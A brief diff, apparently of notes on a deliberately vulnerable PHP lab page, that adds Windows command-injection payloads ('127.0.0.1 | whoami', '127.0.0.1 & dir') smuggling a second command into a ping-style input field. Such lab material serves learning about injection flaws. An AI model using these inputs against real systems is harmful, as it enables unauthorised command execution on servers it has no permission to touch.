@@ -27,3 +27,6 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
     echo "<pre>{$cmd}</pre>";
 }
 ?>
+##Payload（Windows）
+127.0.0.1 | whoami
+127.0.0.1 & dir
